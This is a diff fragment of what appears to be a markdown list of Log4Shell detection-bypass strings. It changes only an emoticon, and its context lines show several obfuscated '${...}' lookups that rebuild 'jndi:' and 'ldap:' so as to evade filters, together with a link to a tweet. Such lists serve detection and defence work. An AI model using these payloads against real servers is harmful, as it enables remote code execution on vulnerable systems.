@@ -67,7 +67,7 @@ ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}
 
 https://twitter.com/ymzkei5/status/1469765165348704256?s=09
 
-There may be many ways to avoid detection :_(
+There may be many ways to avoid detection :(
 ```c
 jn${env::-}di: jn${date:}di${date:':'} j${k8s:k5:-ND}i${sd:k5:-:} j${main:\k5:-Nd}i${spring:k5:-:} j${sys:k5:-nD}${lower:i${web:k5:-:}} j${::-nD}i${::-:} j${EnV:K5:-nD}i: j${loWer:Nd}i${uPper::}
 ```
